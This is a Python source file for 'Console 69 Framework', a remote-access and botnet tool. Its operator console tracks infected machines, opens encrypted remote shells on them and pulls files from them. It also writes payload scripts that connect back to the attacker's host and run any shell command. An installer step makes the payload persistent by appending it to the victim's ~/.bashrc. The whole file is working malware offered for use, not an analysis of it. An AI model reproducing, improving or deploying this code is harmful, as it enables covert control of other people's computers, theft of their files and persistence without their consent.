#!/usr/bin/env python

################## Console 69 Framework By Looper ######################
############################ 2017 (c) ################################## 

# Imports
import socket
import time
import threading
import sys
import subprocess
import re
import os
import time
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto import Random

# GLOBALS
LHOST = ''
LPORT = ''
RHOST = ''
RPORT = ''
BOTNET_MODE = True
TGTS_CONNECTED = []
STANDBY_HOSTS = []
DOWNLOAD_PATH = '/root'
TARGET_HOSTNAME = ""
os.system("reset")
OPTIONS = '''
Options:
  set:
	LHOST 	<IP>	Use this function to set the IP of the LocalHost.
	LPORT 	<PORT>	Use this function to set the PORT of the LocalHost.
	BOTNET_MODE   <on/off>	Use this function to turn on/off the Botnet.
	RPORT 	<PORT>	Use this function to set the port the 
			infected devices may use for conneting
			to the botnet.
	DOWNLOAD_PATH 	<PATH>	Use this function to set the path c69f will use
	to download files from the infected machine.
	help/option/show options Shows this message
  show:
	LHOST 	Shows the IP set for LocalHost.
	LPORT 	Shows the port set for LocalHost.
	BOTNET_MODE Shows the options set for BOTNET_MODE.
	RPORT Shows the port set for the RemoteHost.
	DOWNLOAD_PATH	Shows the path set for c69f downloading the 
			files from the infected machine
	*	Will show all the options.
	
	listen	C69f will start listening for connections, in case BOTNET_MODE
	is on, will start the botnet.
	load configfile <PATH>	Will load the configurations form a file,
	this file must have written the commands correctly
	and have only 1 command per line.
	Example:
	load_file.rc:
	set LHOST 192.168.1.2
	set LPORT 31337
	listen
	create payload <PATH>	Will create a payload on the path you specify,
	this payload will do a connection to your
	computer so you can control it.
	WARNING:
	BEFORE YOU CREATE THE PAYLOAD YOU MUST SPECIFY LHOST,LPORT,
	RPORT,BOTNET_MODE,ETC.
	save configfile	<PATH>	This function will save the configurations 
	you have set into the file you specified.
Options once started a Botnet:
	
	show infected 	This command will show you all the machines that have
	connected to the botnet.
	connect <IP>	If the IP you wrote is infected, you can check it by
	typing "show infected", you will connect to that machine,
	and a shell will be dropped.
Options once connected to the victim:
  NOTE:
	You can use ALL Linux/Windows commands and also the following.
	exit  You will disconnect from the target but you can connect later.
	kill  You will disconnect from the target and the payload you
	 installed on the victims computer will die.
	download  <PATH>  You will download the file you specified in the path,
	this file will be saved on the path you	set in DOWNLOAD_PATH.
'''

# A nice display of the title

print chr(27)+"[0;91m"+"_______________________________________________________________________________"
time.sleep(0.02)
print ""
time.sleep(0.02)
print chr(27)+"[1;91m"+"                    _____   _____   ______   ______"
time.sleep(0.02)
print "                   |  ___| |  ___| | ___  | |  ____|"
time.sleep(0.02)
print "                   | |     | |___  |____  | | |___"
time.sleep(0.02)
print "                   | |___  |  __ |  ____| | |  ___|"
time.sleep(0.02)
print "                   |_____| |_____| |______| |_|"
time.sleep(0.02)
print ""
time.sleep(0.02)
print chr(27)+"[0;93m"+"                              (C) 2017"
time.sleep(0.02)
print "                              By: L00PeR"
time.sleep(0.02)
print "                              Version: 1.0"
time.sleep(0.02)
print ""
time.sleep(0.02)
print chr(27)+"[0;91m"+"_______________________________________________________________________________"
time.sleep(0.02)
print "\n\n"

# This function generates a installer which adds a line to the bashrc file so the virus is continiusly being executed
def generateInstaller(path):
	f = open(path, "w")
	code = '''#!/usr/bin/env python
import os
dir = os.getcwd()
os.system("echo 'python %s/c69payload.py' >> ~/.bashrc" % dir)
	'''
	os.system("chmod +x "+path)
	f.write(code)
	f.close()

# This function is suposed to being able of downloading a file from the victim machine, but its still being developed
def download(data, filename):
	print "[*] Downloading %s to " % filename + DOWNLOAD_PATH
	os.system("echo "" > %s/%s" % (DOWNLOAD_PATH, filename))
	f = open('%s/%s' % (DOWNLOAD_PATH, filename), 'w')
	lines = data.strip("\n")
	i = 0
	while i in range(len(lines)):
		f.write(lines[i])
		i+=1



def create_payload(filename, code):		# This function generates the payload.
	os.system("mkdir "+filename)
	f = open(filename+"/c69payload.py", 'w')
	f.write(code)

def check_options():					# This function checks that, at least, LHOST & LPORT; are set
	global LHOST, LPORT, RHOST
	if LHOST != "" and " " not in LHOST:
		if LPORT != "" and " " not in LPORT:
			if BOTNET_MODE == False:
				if RHOST != "" and " " not in RHOST:
					return 1
				else:
					confirm = raw_input("You haven\'t specified any RemoteHost,\nall machines are going to be able to connect to you,\nare you sure you don't want to specify any RHOST? y/n ")
					if confirm == 'y' or confirm == 'Y':
						return 1
					elif confirm == 'n' or confirm == 'N':
						print "Then, type: \'set RHOST <ip>"
					else:
						return 0
			else:
				return 1
		else:
			print "[!] No LPORT has been selected"
			return 0
	else:
		print "[!] no LHOST has been selected"
		return 0

# This function is called with a thread and listens to connections and then, adds the ip to the infected array
def listen_botnet():
	global TARGET_HOSTNAME
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.bind((LHOST, int(LPORT)))
	except Exception, err:
		p_continue = False


	while 1:
		s.listen(1)
		c, addr = s.accept()
		if addr[0] not in TGTS_CONNECTED:
			TGTS_CONNECTED.append(addr[0])
		c.send(str(addr[0]))
		TARGET_HOSTNAME = c.recv(1024)
		c.close()

# This function removes the device from the infected array, but doesn't close the connection
def remove_infected(tgt):
	i = 0
	while 1:
		if TGTS_CONNECTED[i] == tgt:
			TGTS_CONNECTED[i] = ""
			break
		else:
			i+=1
# This function starts the shell on the victim machine
def tgt_connect_botnet(tgt):
	global STANDBY_HOSTS, TARGET_HOSTNAME
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	check = ''
	try:
		s.connect((tgt, int(RPORT)))
		just_continue = False
		check = s.recv(1024)
	except socket.error:
		print "[!] An error ocurred while connecting to "+tgt
		i = 0
		while i in range(len(TGTS_CONNECTED)):
			if TGTS_CONNECTED[i] == tgt:
				TGTS_CONNECTED[i] = ''
			i+=1	

		start_botnet(True)

	if tgt in STANDBY_HOSTS:
		just_continue = True
	if check == 'READY' or just_continue == True:
		random_generator = Random.new().read
		sentinel = Random.new().read(4415000)
		Akey = RSA.generate(4096, random_generator)
		s.send(Akey.publickey().exportKey())
		Vkey = RSA.importKey(s.recv(1000000))
		ecipher = PKCS1_v1_5.new(Vkey)
		dcipher = PKCS1_v1_5.new(Akey)
		s.send(ecipher.encrypt("PATH"))
		tgt_path = dcipher.decrypt(s.recv(10000000), sentinel)
		while 1:
			print chr(27)+"[1;91m"
			cmd = raw_input("[%s:%s] $ " % (tgt, tgt_path))
			print chr(27)+"[1;93m"
			if cmd == "":
				pass
			elif cmd == 'exit':
				s.send(ecipher.encrypt(cmd))
				s.close()
				STANDBY_HOSTS.append(tgt)
				start_botnet(True)
			elif cmd == 'kill':
				s.send(ecipher.encrypt(cmd))
				s.close()
				remove_infected(tgt)
				break
			else:
				s.send(ecipher.encrypt(cmd))

				if cmd.startswith("cd "):
					response = dcipher.decrypt(s.recv(10000000), sentinel)
					if response.startswith("[!]"):
						print response
					else:
						tgt_path = response
				elif cmd.startswith("download "):
					filetodownload = cmd[9:]
					if ' ' in filetodownload:
						print "[!] Too much arguments for \"download\""
					else:
						data = dcipher.decrypt(s.recv(3000000), sentinel)
						download(data, filetodownload)
				else:
					output = dcipher.decrypt(s.recv(3000000), sentinel)
					if output != '[OK]':
						if output == "[DIVIDED PACKETS]":
							nPackets = dcipher.decrypt(s.recv(1000000), sentinel)
							i = 1
							while i in range(npackets):
								print dcipher.decrypt(s.recv(10000000), sentinel)
								i+=1
						else:	
							print output
					else:
						pass

# This function starts the botnet
def start_botnet(already_started):
	global LHOST, LPORT, TGTS_CONNECTED, TARGET_HOSTNAME

	if check_options() == 1:
		if already_started != True:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			p_continue = True
		
			start = raw_input("Do you want to start listening to connections? Y/n ")
		else:
			start = 'y'
			p_continue = True
		try:
			t = threading.Thread(target=listen_botnet)
			t.start()
			if start == 'y' or start == 'Y':
				while 1:
					print chr(27)+"[1;91m"
					cmd = raw_input("[BOTNET] $ ")
					print chr(27)+"[1;93m"

					if cmd.startswith("connect ") or cmd.startswith("exploit "):
						i = 0
						spaces = 0
						rhost = ""

						for letter in cmd:
							if letter != ' ':
								rhost+=letter
								i+=1
							else:
								if spaces == 0:
									spaces+=1
									rhost = ''
								else:
									break

						if rhost in TGTS_CONNECTED:
							tgt_connect_botnet(rhost)
						else:
							print "[!] Target has not connected to the botnet."
					elif cmd.startswith("show "):
						i = 0
						spaces = 0
						parameter = ""

						for letter in cmd:
							if letter != ' ':
								parameter+=letter
								i+=1
							else:
								if spaces == 0:
									spaces+=1
									parameter = ''
								else:
									break
						if parameter == 'infected':
							
							i = 0
							if len(TGTS_CONNECTED) == 0:
								print "\nAny device infected\n"
							while i in range(len(TGTS_CONNECTED)):
								print "\n"+TGTS_CONNECTED[i]+"\t"+TARGET_HOSTNAME+"\n"
								i+=1
							
						else:
							print "[!] Unknown parameter: "+parameter
					elif cmd == 'exit':
						raise(KeyboardInterrupt)

					else:
						i = 0
						spaces = 0
						wrong_command = ''
						for letter in cmd:
							if letter != ' ':
								wrong_command+=letter
								i+=1
							else:
								if spaces == 0:
									spaces+=1
									parameter = ''
								if spaces == 1:
									break
				
						pass
						if cmd != "":
							print "[!] Unknow command: "+wrong_command
						else:
							pass


		except KeyboardInterrupt:
			try:
				c.close()
			except:
				pass
			try:
				s.close()
			except:
				pass
			try:
				t.kill()
			except:
				pass

def main():
	global LHOST, LPORT, RPORT, RHOST, BOTNET_MODE, TGTS_CONNECTED, STANDBY_HOSTS, DOWNLOAD_PATH
	while 1:
		print chr(27)+"[1;0m"
		command = raw_input("C69F >># ")	# Shell
		print chr(27)+"[1;93m"
		if command == 'exit' or command == 'quit':
			sys.exit()

		if command.startswith("set "):
			parameter = ''
			i = 0
			spaces = 0
			for letter in command:			#
				if letter != ' ':			#
					parameter+=letter		#		THIS PIECE OF CODE
					i+=1 					#		
				else: 						#		GETS THE FIRST ARGUMENT OF THE COMMAND "set"
					if spaces == 0:			#
						spaces+=1 			#		EXAMPLES:
						parameter = ''		#
					elif spaces == 1:		#		- LHOST
						spaces+=1 			#		- LPORT
											#
					if spaces == 2:			#
						break				#
				pass						#
			if parameter == 'LHOST':
				host = command[10:]		# Gets the second argument of the command "set"
				if ' ' in host:
					print "[!] Too many arguments for function set."
					print "Example: set LHOST 127.0.0.1"
				elif host == "":
					print "[!] Please select an ip for LHOST"
					print "LHOST ---> empty"
				else:	
					LHOST = host
					print "LHOST ---> "+LHOST
			elif parameter == 'LPORT':
				port = command[10:]		# Gets the second argument of the command "set"
				if ' ' in port:
					print "[!] Too many arguments for function set."
					print "Example: set LPORT 31337"
				else:
					LPORT = port
					print "LPORT ---> "+LPORT
			elif parameter == 'RHOST':
				target = command[10:]	# Gets the second argument of the command "set"
				if ' ' in target:
					print "[!] Too many arguments for function set."
					print "Example: set RHOST 192.168.1.1"
				else:
					RHOST = target
					print "RHOST ---> "+RHOST
			elif parameter == 'RPORT':
				rport = command[10:]
				if ' ' in rport:
					print "[!] Too many arguments for function set."
					print "Example: set RHOST 192.168.1.1"
				else:
					RPORT = rport
					print "RPORT ---> "+RPORT

			elif parameter == 'BOTNET_MODE':
				switch = command[16:]
				if ' ' in switch:
					print "[!] Too many arguments for function set."
					print "Example: set BOTNET_MODE on"
				else:
					if switch == 'on':
						BOTNET_MODE = True
						print "BOTNET_MODE ---> "+str(BOTNET_MODE)
					else:
						BOTNET_MODE = False
						print "BOTNET_MODE ---> "+str(BOTNET_MODE)
			elif parameter == 'DOWNLOAD_PATH':
				path = command[18:]
				if ' ' in path:
					print '[!] Too much parameters for function set.'
					print "Example: set DOWNLOAD_PATH /root/Desktop"
				else:
					print "[+] DOWNLOAD_PATH ---> "+ STR(DOWNLOAD_PATH)
					DOWNLOAD_PATH = path

			else:
				print "[!] Unknown parameter: \""+parameter+"\" for function \"set\""

		elif command.startswith("show "):	#
			parameter = ''					#
			i = 0 							#		THIS PIECE OF CODE, GETS
			spaces = 0 						#
			for letter in command: 			#		THE ARGUMENT OF THE COMMAND
				if letter != ' ': 			#
					parameter+=letter		#		"show".
					i+=1 					#
				else: 						#		EXAMPLE:
					if spaces == 0:			#
						spaces+=1 			#		- LHOST
						parameter = '' 		#
					elif spaces == 1: 		#		- LPORT
						spaces+=1 			#
											#
					if spaces == 2: 		#
						break 				#
				pass						#
			if parameter == 'LHOST':
				if LHOST != '':
					print "LHOST ---> "+LHOST
				else:
					print "LHOST is empty, set LHOST <ip>"
			if parameter == 'LPORT':
				if LPORT != "":
					print "LPORT ---> "+LPORT
				else:
					print "LPORT is empty, set LPORT <port>"
			if parameter == 'RHOST':
				if RHOST != "":
					print "RHOST ---> "+RHOST
				else:
					print "RHOST is empty, set RHOST <ip>"
			if parameter == 'RPORT':
				if RPORT != "":
					print "RPORT ---> "+RPORT
				else:
					print "RPORT is empty, set RPORT <port>"
			if parameter == '*':
				
				if LHOST != "":
					print "LHOST ---> "+LHOST
				else:
					print "LHOST ---> empty"
					if LPORT != "":
						print "LPORT ---> "+LPORT
					else:
						print "LPORT ---> empty"
				if RHOST != "":
					print "RHOST ---> "+RHOST
				else:
					print "RHOST ---> empty"
				if RPORT != "":
					print "RPORT ---> "+RHOST
				else:
					print "RPORT ---> empty"

			if parameter == 'options':			# Displays the options	
				global OPTIONS
				print chr(27)+'[0;93m'
				print OPTIONS

		elif command == 'options' or command == 'help':		# Displays the options
			global OPTIONS
			print chr(27)+'[0;93m'
			print OPTIONS

		elif command == 'listen' or command == 'exploit':		# This command starts listening to connections, for spawning a shell
			if check_options() == 1:
				if BOTNET_MODE == False:
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					p_continue = True
					try:
						s.bind((LHOST, int(LPORT)))
					except Exception, err:
						print "[!] An error ocurred while binding to %s:%i" % (LHOST, int(LPORT))
						print err
						p_continue = False
					if p_continue == True:
						print "[+] Binded to %s:%s" % (LHOST, LPORT)
						start = raw_input("Do you want to start listening to connections? Y/n ")
						print "PRESS CONTROL+C TO STOP"
						try:
							if start == 'y' or start == 'Y':
								while 1:
									s.listen(1)
									c, addr = s.accept()
									if RHOST == "":

										print "[+] "+str(addr[0])+" connected!"

										while 1:
											data = c.recv(1024)
											if data != "[OK]":
												print data
											else:
												pass
											cmd = raw_input("[%s]$ " % addr[0]) 
											c.send(cmd)
											if cmd == 'exit':
												break
										c.close()
										sys.exit()
									else:
										if addr[0] != RHOST:
											print "[!] "+str(addr[0])+" tried to connect"
											c.close()
						except KeyboardInterrupt:
							try:
								c.close()
							except:
								pass
							break

					else:
						pass
				else:
					print "[*] Starting botnet..."
					start_botnet(False)

			else:
				pass
		elif command.startswith("load "):
			i = 0									
			spaces = 0
			parameter = ""
			for letter in command:
				if letter != ' ':
					parameter+=letter
					i+=1
				else:
					if spaces == 0:
						spaces+=1
						parameter = ''
					else:
						break

			if parameter == "configfile":
				i = 0
				spaces = 0
				filename = ""
				for letter in command:
					if letter != ' ':
						filename+=letter
						i+=1
					else:
						if spaces == 0:
							spaces+=1
							filename = ""
						elif spaces == 1:
							spaces+=1
							filename = ""
						else:
							break
					pass
				try:
					f = open(filename, 'r')
					for cmd in f.readlines():
						command = cmd.strip("\n")
						if command.startswith("set "):
							parameter = ''
							i = 0
							spaces = 0
							for letter in command:			#
								if letter != ' ':			#
									parameter+=letter		#		THIS PIECE OF CODE
									i+=1 					#		
								else: 						#		GETS THE FIRST ARGUMENT OF THE COMMAND "set"
									if spaces == 0:			#
										spaces+=1 			#		EXAMPLES:
										parameter = ''		#
									elif spaces == 1:		#		- LHOST
										spaces+=1 			#		- LPORT
															#
									if spaces == 2:			#
										break				#
								pass						#
							if parameter == 'LHOST':
								host = command[10:]		# Gets the second argument of the command "set"
								if ' ' in host:
									print "[!] Too many arguments for function set."
									print "Example: set LHOST 127.0.0.1"
								elif host == "":
									print "[!] Please select an ip for LHOST"
									print "LHOST ---> empty"
								else:	
									LHOST = host
									print "LHOST ---> "+LHOST
							elif parameter == 'LPORT':
								port = command[10:]		# Gets the second argument of the command "set"
								if ' ' in port:
									print "[!] Too many arguments for function set."
									print "Example: set LPORT 31337"
								else:
									LPORT = port
									print "LPORT ---> "+LPORT
							elif parameter == 'RHOST':
								target = command[10:]	# Gets the second argument of the command "set"
								if ' ' in target:
									print "[!] Too many arguments for function set."
									print "Example: set RHOST 192.168.1.1"
								else:
									RHOST = target
									print "RHOST ---> "+RHOST
							elif parameter == 'RPORT':
								rport = command[10:]
								if ' ' in rport:
									print "[!] Too many arguments for function set."
									print "Example: set RHOST 192.168.1.1"
								else:
									RPORT = rport
									print "RPORT ---> "+RPORT

							elif parameter == 'BOTNET_MODE':
								switch = command[16:]
								if ' ' in switch:
									print "[!] Too many arguments for function set."
									print "Example: set BOTNET_MODE on"
								else:
									if switch == 'on':
										BOTNET_MODE = True
										print "BOTNET_MODE ---> "+str(BOTNET_MODE)
									else:
										BOTNET_MODE = False
										print "BOTNET_MODE ---> "+str(BOTNET_MODE)
							elif parameter == 'DOWNLOAD_PATH':
								path = command[18:]
								if ' ' in path:
									print '[!] Too much parameters for function set.'
									print "Example: set DOWNLOAD_PATH /root/Desktop"
								else:
									print '[+] DOWNLOAD_PATH ---> '+DOWNLOAD_PATH
									DOWNLOAD_PATH = path

							else:
								print "[!] Unknown parameter: \""+parameter+"\" for function \"set\""
						elif command.startswith("create "):			# This command creates the payload with the LHOST
							i = 0									# and the LPORT that has been set before
							spaces = 0
							parameter = ""
							for letter in command:
								if letter != ' ':
									parameter+=letter
									i+=1
								else:
									if spaces == 0:
										spaces+=1
										parameter = ''
									else:
										break

							if parameter == "payload":
								i = 0
								spaces = 0
								filename = ""
								for letter in command:
									if letter != ' ':
										filename+=letter
										i+=1
									else:
										if spaces == 0:
											spaces+=1
											filename = ""
										elif spaces == 1:
											spaces+=1
											filename = ""
										else:
											break
									pass
				
								if check_options() == 1:
									pass
					
								print "Creating payload"
								print "Options:"
								print "\tLHOST ---> "+str(LHOST)
								print "\tLPORT ---> "+str(LPORT)
								print "\tBOTNET_MODE ---> "+str(BOTNET_MODE)
								if RHOST == "":
									print "\tRHOST ---> empty"
								if BOTNET_MODE == False:
									code = '''#!/usr/bin/env python
import os
import socket
import time
import subprocess
import sys
import re
server_ip = '%s'
server_port = %s
server_address = (server_ip, server_port)
def connect():
	global server_address, server_port, server_ip
	while 1:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect(server_address)
			sock.send("[*] Spawning shell...")
			break
		except Exception, err:
			pass
def start_command_line():
	while True:
		data = sock.recv(1024)
		if data:
			if data == 'exit':
				sock.close()
				connect()
			elif data == 'PATH':
				s.send(os.getcwd())
			elif data.startswith("cd "):
				try:
					os.chdir(data[3:])
					sock.send(os.getcwd())
				except:
					c.send("[!] "+data[3:]+" does not exist")
			elif data.startswith("download "):
				filename = data[9:]
				f = open(filename, 'r')
				data = f.readlines()
				c.send(str(data))
			else:
				proc2 = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = proc2.stdout.read() + proc2.stderr.read()
				sock.send(output)
				if output == '':
					sock.send("[OK]")
				''' % (LHOST, LPORT)
								else:
									code = '''#!/usr/bin/env python
############### Console 69 Payload By Looper ####################
######################## (c) 2017 ###############################
import os
import socket
import time
import subprocess
import sys
import re
from multiprocessing import Process
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto import Random

server_ip = ''
server_port = %s
rport = %s
rhost = "%s"
def start_command_line():
	global server_ip, server_port, rport, rhost
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while 1:
		try:
			s.bind((server_ip, server_port))
			break
		except socket.error:
			server_port+=1
	s.listen(1)
	c, addr = s.accept()
	random_generator = Random.new().read
	sentinel = Random.new().read(4115)
	Vkey = RSA.generate(4096, random_generator)
	c.send("READY")
	Akey = RSA.importKey(c.recv(1000000))
	c.send(Vkey.publickey().exportKey())
	ecipher = PKCS1_v1_5.new(Akey)
	dcipher = PKCS1_v1_5.new(Vkey)

	while 1:
		cmd = dcipher.decrypt(c.recv(10000000), sentinel)
		if cmd:
			if cmd == 'exit':
				dta = ''
				while dta != 'continue':
					c.close()
					s.close()
					infected()
			elif cmd == 'kill':
				c.close()
				s.close()
				exit(0)
			elif cmd == "PATH":
				c.send(ecipher.encrypt(os.getcwd()))
			elif cmd.startswith("cd "):
				try:
					os.chdir(cmd[3:])
					c.send(ecipher.encrypt(os.getcwd()))
				except:
					c.send(ecipher.encrypt("[!] "+cmd[3:]+" does not exist"))
			elif cmd.startswith("download "):
				filename = cmd[9:]
				f = open(filename, 'r')
				data = f.readlines()
				c.send(ecipher.encrypt(str(data)))
			else:
				proc2 = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = proc2.stdout.read() + proc2.stderr.read()
				if len(output) <= 460:
					c.send(ecipher.encrypt(output))
				else:
					c.send(ecipher.encrypt("[DIVIDED PACKETS]"))
					nPackets = len(output) / 460
					if len(output) % 460 != 0:
						nPackets +=1
					c.send(ecipher.encrypt(str(nPackets)))
					i = 1
					j = 0
					while i in range(nPackets):
						try:
							print output[j:j+460]
							c.send(ecipher.encrypt(output[j:j+460]))
						except IndexError:
							c.send(ecipher.encrypt(output[j:]))
						i+=1
						j+=461 
				if output == "":
					c.send(ecipher.encrypt("[OK]"))
def infected():
	global server_ip, server_port, rport, rhost
	while 1:
		try:
			cnn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			cnn.connect((rhost, rport))
			server_ip = cnn.recv(1024)
			cnn.send(socket.gethostname())
			cnn.close()
			break
		except:
			pass
	start_command_line()
newRef = os.fork()
if newRef == 0:
	infected()

''' % (RPORT, LPORT, LHOST)
								create_payload(filename,code)
				
								f = open(filename+"/c69payload.py", 'r')
								if f.readlines() == "":
									try:
										while 1:
											print "[!] An error ocurred while writing the program to: "+filename
											filename = raw_input("Please type the FULL PATH to the file: ")
											f = open(filename, 'r')
											if f.readlines() != "":
												break
									except KeyboardInterrupt:
										exit(0)
								print "[+] Payload created."
								print "[+] Payload generated on "+filename
								os.system("chmod 755 %s" % filename+"/c69payload.py")
								generateInstaller(filename+"/installer.py")
							else:
								print "[!] Unknown parameter: "+parameter

				except IOError:
					print "[!] File does not exist"

		elif command.startswith("save "):
			i = 0									
			spaces = 0
			parameter = ""
			for letter in command:
				if letter != ' ':
					parameter+=letter
					i+=1
				else:
					if spaces == 0:
						spaces+=1
						parameter = ''
					else:
						break
			if parameter == "configfile":
				i = 0
				spaces = 0
				filename = ""
				for letter in command:
					if letter != ' ':
						filename+=letter
						i+=1
					else:
						if spaces == 0:
							spaces+=1
							filename = ""
						elif spaces == 1:
							spaces+=1
							filename = ""
						else:
							break
					pass
				os.system("echo '' > %s" % filename)
				print "[+] %s created !" % filename
				f = open(filename, 'w')
				if LHOST != "":
					f.write("set LHOST %s\n" % LHOST)
				if LPORT != "":
					f.write("set LPORT %s\n" % LPORT)
				if RHOST != "":
					f.write("set RHOST %s\n" % RHOST)
				if RPORT != "":
					f.write("set RPORT %s\n" % RPORT)
				if BOTNET_MODE == True:
					f.write("set BOTNET_MODE on\n")
				else:
					f.write("set BOTNET_MODE off\n")
				f.close()
		elif command.startswith("create "):			# This command creates the payload with the LHOST
			i = 0									# and the LPORT that has been set before
			spaces = 0
			parameter = ""
			for letter in command:
				if letter != ' ':
					parameter+=letter
					i+=1
				else:
					if spaces == 0:
						spaces+=1
						parameter = ''
					else:
						break

			if parameter == "payload":
				i = 0
				spaces = 0
				filename = ""
				for letter in command:
					if letter != ' ':
						filename+=letter
						i+=1
					else:
						if spaces == 0:
							spaces+=1
							filename = ""
						elif spaces == 1:
							spaces+=1
							filename = ""
						else:
							break
					pass
				
				if check_options() == 1:
					if not filename.endswith(".py"):
						pass
					
					print "Creating payload"
					print "Options:"
					print "\tLHOST ---> "+str(LHOST)
					print "\tLPORT ---> "+str(LPORT)
					print "\tBOTNET_MODE ---> "+str(BOTNET_MODE)
					if RHOST == "":	
						print "\tRHOST ---> empty"
					if BOTNET_MODE == False:
						code = '''#!/usr/bin/env python
import os
import socket
import time
import subprocess
import sys
import re
server_ip = '%s'
server_port = %s
server_address = (server_ip, server_port)
def connect():
	global server_address, server_port, server_ip
	while 1:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			sock.connect(server_address)
			sock.send("[*] Spawning shell...")
			break
		except Exception, err:
			pass
def start_command_line():
	while True:
		data = sock.recv(1024)
		if data:
			if data == 'exit':
				sock.close()
				connect()
			elif data == 'PATH':
				s.send(os.getcwd())
			elif data.startswith("cd "):
				try:
					os.chdir(data[3:])
					sock.send(os.getcwd())
				except:
					c.send("[!] "+data[3:]+" does not exist")
			elif data.startswith("download "):
				filename = data[9:]
				f = open(filename, 'r')
				data = f.readlines()
				c.send(str(data))
			else:
				proc2 = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = proc2.stdout.read() + proc2.stderr.read()
				sock.send(output)
				if output == '':
					sock.send("[OK]")
				''' % (LHOST, LPORT)
					else:
						code = '''#!/usr/bin/env python
############### Console 69 Payload By Looper ####################
######################## (c) 2017 ###############################
import os
import socket
import time
import subprocess
import sys
import re
from multiprocessing import Process
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto import Random

server_ip = ''
server_port = %s
rport = %s
rhost = "%s"
def start_command_line():
	global server_ip, server_port, rport, rhost
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while 1:
		try:
			s.bind((server_ip, server_port))
			break
		except socket.error:
			server_port+=1
	s.listen(1)
	c, addr = s.accept()
	random_generator = Random.new().read
	sentinel = Random.new().read(4115)
	Vkey = RSA.generate(4096, random_generator)
	c.send("READY")
	Akey = RSA.importKey(c.recv(1000000))
	c.send(Vkey.publickey().exportKey())
	ecipher = PKCS1_v1_5.new(Akey)
	dcipher = PKCS1_v1_5.new(Vkey)

	while 1:
		cmd = dcipher.decrypt(c.recv(10000000), sentinel)
		if cmd:
			if cmd == 'exit':
				dta = ''
				while dta != 'continue':
					c.close()
					s.close()
					infected()
			elif cmd == 'kill':
				c.close()
				s.close()
				exit(0)
			elif cmd == "PATH":
				c.send(ecipher.encrypt(os.getcwd()))
			elif cmd.startswith("cd "):
				try:
					os.chdir(cmd[3:])
					c.send(ecipher.encrypt(os.getcwd()))
				except:
					c.send(ecipher.encrypt("[!] "+cmd[3:]+" does not exist"))
			elif cmd.startswith("download "):
				filename = cmd[9:]
				f = open(filename, 'r')
				data = f.readlines()
				c.send(ecipher.encrypt(str(data)))
			else:
				proc2 = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				output = proc2.stdout.read() + proc2.stderr.read()
				c.send(ecipher.encrypt(output))
				if output == "":
					c.send(ecipher.encrypt("[OK]"))
def infected():
	global server_ip, server_port, rport, rhost
	while 1:
		try:
			cnn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
			cnn.connect((rhost, rport))
			server_ip = cnn.recv(1024)
			cnn.send(socket.gethostname())
			cnn.close()
			break
		except:
			pass
	start_command_line()
newRef = os.fork()
if newRef == 0:
	infected()

''' % (RPORT, LPORT, LHOST)
					create_payload(filename,code)
				
					f = open(filename+"/c69payload.py", 'r')
					if f.readlines() == "":
						pass
					print "[+] Payload created."
					print "[+] Payload generated on "+filename
					os.system("chmod 755 %s" % filename+"/c69payload.py")
					generateInstaller(filename+"/installer.py")
			else:
				print "[!] Unknown parameter: "+parameter


		else:
			i = 0
			spaces = 0
			wrong_command = ''
			for letter in command:
				if letter != ' ':
					wrong_command+=letter
					i+=1
				else:
					if spaces == 0:
						spaces+=1
						parameter = ''
					if spaces == 1:
						break
					
					pass
			if command != "":
				print "[!] Unknow command: "+wrong_command
			else:
				pass

if __name__ == '__main__':
	main()
